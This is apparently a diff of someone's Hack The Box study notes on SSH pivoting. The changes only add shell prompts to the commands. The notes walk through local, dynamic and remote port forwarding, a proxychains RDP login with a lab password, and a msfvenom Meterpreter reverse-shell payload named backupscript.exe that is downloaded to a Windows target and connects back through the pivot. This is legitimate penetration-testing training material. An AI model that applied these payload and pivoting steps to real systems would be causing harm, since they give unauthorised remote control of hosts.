@@ -9,7 +9,7 @@
 ![[SSH Local Port Forwarding.png]]
 - We will use the below command to forward our local port (1234) over SSH to the Ubuntu server.
 ```shell-session
-ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
+AnuragTaparia@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
 ```
 - The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port `1234` to `localhost:3306` on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234.
 
@@ -27,7 +27,7 @@ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
 #### Enabling Dynamic Port Forwarding with SSH
 
 ```shell-session
-ssh -D 9050 ubuntu@10.129.202.64
+AnuragTaparia@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
 ```
 - The `-D` argument requests the SSH server to enable dynamic port forwarding.
 -  Once we have this enabled, we will require a tool that can route any tool's packets over the port `9050`. We can do this using the tool `proxychains`, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together.
@@ -74,7 +74,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 - To gain a `Meterpreter shell` on Windows, we will create a Meterpreter HTTPS payload using `msfvenom`, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (`172.16.5.129`). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.
 
 ```shell-session
-msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+AnuragTaparia@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
 ```
 
 #### Configuring & Starting the multi/handler
@@ -91,7 +91,7 @@ run
 #### Transferring Payload to Pivot Host
 
 ```shell-session
-scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
+AnuragTaparia@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
 ```
 
 - After copying the payload, we will start a `python3 HTTP server` using the below command on the Ubuntu server in the same directory where we copied our payload.
@@ -104,7 +104,7 @@ ubuntu@Webserver$ python3 -m http.server 8123
 #### Downloading Payload from Windows Target
 
 ```powershell-session
-Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
 ```
 
 - Once we have our payload downloaded on the Windows host, we will use `SSH remote port forwarding` to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. 
@@ -112,7 +112,7 @@ Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\
 #### Using SSH -R
 
 ```shell-session
-ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
+AnuragTaparia@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
 ```
 - After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.
 - If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.
